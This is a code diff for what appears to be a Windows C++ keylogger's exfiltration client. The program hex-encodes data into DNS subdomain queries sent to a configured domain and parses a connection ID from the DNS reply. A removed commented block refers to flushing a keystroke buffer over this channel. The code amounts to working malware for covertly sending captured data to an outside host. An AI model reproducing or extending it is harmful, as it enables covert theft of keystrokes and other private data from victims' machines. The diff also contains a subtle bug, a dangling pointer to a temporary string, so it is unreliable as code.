@@ -35,7 +35,7 @@ int startConnection(const char* domain);
  * domain: cstring containing domain (eg. example.com)
  * returns: -1 if failed, 0 otherwise
  */
-int sendData(int id, int packetNumber, const char* domain, const char* data);
+int sendData(int& id, int& packetNumber, const char* domain, const char* data);
 
 /**
  * Converts a cstring to a std::string containing the hex encoded characters of the cstring.
@@ -44,30 +44,9 @@ int sendData(int id, int packetNumber, const char* domain, const char* data);
  */
 std::string convertToHex(const char* string);
 
-// if (keystrokeBuffer.size() >= MAX_BUFFER) {
-	//const char* pOwnerName = DOMAIN;
-	//WORD wType = DNS_TYPE_A;
-	//PDNS_RECORD pDnsRecord;
-	//DNS_STATUS status = DnsQuery_A(pOwnerName,
-	//							   wType,
-	//							   DNS_QUERY_BYPASS_CACHE,
-	//							   NULL,
-	//							   &pDnsRecord,
-	//							   NULL);
-	//if (status) {
-	//	std::cout << "Failed to query: " << status << std::endl;
-	//} else {
-	//	IN_ADDR ipaddr;
-	//	ipaddr.S_un.S_addr = (pDnsRecord->Data.A.IpAddress);
-	//	std::cout << "IP Response: " << inet_ntoa(ipaddr) << std::endl;
-	//	DnsRecordListFree(pDnsRecord, DNS_FREE_TYPE::DnsFreeRecordList);
-	//}
-	//keystrokeBuffer = "";
-//}
-
 int main(int argc, char* argv[]) {
-	std::cout << convertToHex("bruh") << std::endl;
 	while ((connectionId = startConnection(DOMAIN)) == -1) {
+		Sleep(250);  // sleep to prevent spamming
 		std::cout << "Failed to establish connection" << std::endl;
 	}
 	std::cout << "Connection ID: " << connectionId << std::endl;
@@ -130,13 +109,14 @@ int startConnection(const char* domain) {
 	} else {
 		IN_ADDR ipaddr;
 		ipaddr.S_un.S_addr = (pDnsRecord->Data.A.IpAddress);
-		std::cout << "IP: " << inet_ntoa(ipaddr) << std::endl;
+		std::string ipStr = inet_ntoa(ipaddr);
+		std::cout << "IP: " << ipStr << std::endl;
 		DnsRecordListFree(pDnsRecord, DNS_FREE_TYPE::DnsFreeRecordList);
-		return 1;   // change to actual connection id
+		return std::stoi(ipStr.substr(ipStr.rfind(".") + 1));
 	}
 }
 
-int sendData(int id, int packetNumber, const char* domain, const char* data) {
+int sendData(int& id, int& packetNumber, const char* domain, const char* data) {
 	std::ostringstream fullStream;
 	fullStream << "b." << packetNumber << "." << id << "." << convertToHex(data) << "." << domain;
 	const char* pOwnerName = fullStream.str().c_str();
